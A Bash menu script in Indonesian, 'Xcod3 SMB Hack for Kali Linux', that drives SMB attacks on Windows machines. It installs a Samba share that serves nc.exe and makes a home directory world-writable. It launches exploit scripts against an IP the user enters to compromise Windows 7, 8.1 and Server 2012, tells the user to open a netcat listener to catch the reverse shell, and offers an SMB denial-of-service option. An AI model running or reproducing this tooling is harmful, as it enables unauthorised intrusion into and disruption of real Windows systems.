#!/bin/bash

again='y'
while [ $again == 'Y' ] || [ $again == 'y' ];
do
clear
echo "======================================================";
echo " Xcod3 SMB Hack for Kali Linux                       ";
echo " Hack windows 7/8.1/2012 dan DoS Windows 7/8.1/10     ";
echo " Bypass Firewall & bypass Windows Defender            ";
echo " Oleh Xcod3bughunt3r                                       ";
echo " master@itsecurity.id                        ";
echo " www.itsecurity.id		                                    ";
echo "------------------------------------------------------";
echo " 1. Status Xcod3 SMB Hack                            ";
echo "------------------------------------------------------";
echo " 2. Install Xcod3 SMB Hack for Kali Linux            ";
echo "------------------------------------------------------";
echo " Remote                                               ";
echo " 3. Edit Exploit untuk remote Windows 7 / 8.1         ";
echo " 4. Hack Windows 7 / 8.1                              ";
echo "------------------------------------------------------";
echo " Remote                                               ";
echo " 5. Edit Exploit untuk remote Windows 2012            ";
echo " 6. Hack Windows Server 2012                          ";
echo "------------------------------------------------------";
echo " 7. Uninstall Xcod3 SMB Hack for Kali Linux          ";
echo "------------------------------------------------------";
echo " Denial of Service                                    ";
echo " 8. Denial of Service SMB Windows 7 / 8.1 / 10        ";
echo "------------------------------------------------------";
echo " 9. Exit                                             ";
echo "======================================================";

read -p "Masukkan Pilihan Anda antara 1 hingga 9: " choice;
echo "";
case $choice in

1)  if [ -z "$(sudo ls -A /home/xcod3/nc.exe)" ]; then
    echo "Xcod3 SMB Hack belum diinstall"
    else
    echo "Xcod3 SMB Hack sudah diinstall"
    fi
    ;;

2)  if [ -z "$(sudo ls -A /home/xcod3/nc.exe)" ]; then
    echo "Install Xcod3 SMB Hack"
    echo "-----------------------"
    sudo apt-get install samba
    sudo useradd -m xcod3
    sudo cp support/nc.exe /home/xcod3/
    sudo mv /etc/samba/smb.conf /tmp
    sudo cp support/smb.conf /etc/samba/
    service smbd restart
    chmod 777 /home/xcod3  
    else
    echo "Xcod3 SMB Hack sudah diinstall"
    fi
    ;;
 
3)  sudo nano support/1hack.py
    ;;

4)  echo "Pastikan dulu sebelum memasukkan ip target, sudah menjalankan nc -v -l -p 1500 di terminal lain dan mengedit exploit."  
    echo -n "Masukkan ip target: "
    read iptarget
    if [ -z "$(sudo ls -A /home/xcod3/nc.exe)" ]; then
    echo "Xcod3 SMB Hack belum diinstall, install dulu baru dijalankan"
    else
    echo "Hack Windows now!"
    sudo python support/mysmb.py
    sudo python support/1hack.py $iptarget
    fi
    ;;

5)  sudo nano support/2hack.py
    ;;

6)  echo "Pastikan dulu sebelum memasukkan ip target, sudah menjalankan nc -v -l -p 1500 di terminal lain dan mengedit exploit."    
    echo -n "Masukkan ip target: "
    read iptarget
    if [ -z "$(sudo ls -A /home/xcod3/nc.exe)" ]; then
    echo "Xcod3 SMB Hack belum diinstall, install dulu baru dijalankan"
    else
    echo "Hack Windows now!"
    sudo python support/mysmb.py
    sudo python support/2hack.py $iptarget    
    fi
    ;;

7)  if [ -z "$(sudo ls -A /home/xcod3/nc.exe)" ]; then
    echo "Xcod3 SMB Hack belum install, apa yang mau diuninstall?"
    else
    echo "Xcod3 SMB Hack diuninstall"
    echo "---------------------------"
    sudo cp /tmp/smb.conf /etc/samba
    sudo userdel xcod3
    sudo rm -r /home/xcod3
    fi
    ;;

8)  echo "Denial of Service pada Windows 7,8.1,10)"  
    echo -n "Masukkan ip target: "
    read iptarget
    sudo python support/mysmb.py
    sudo python support/1dos.py $iptarget
    ;;

9)  exit
    ;;
*)    echo "Maaf, menu tidak ada"
esac
echo ""
echo "Xcod3 SMB Hack"
echo "Developers : ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id"
echo ""
echo -n "Kembali ke menu? [y/n]: ";
read again;
while [ $again != 'Y' ] && [ $again != 'y' ] && [ $again != 'N' ] && [ $again != 'n' ];
do
echo "Masukkan yang anda pilih tidak ada di menu";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done
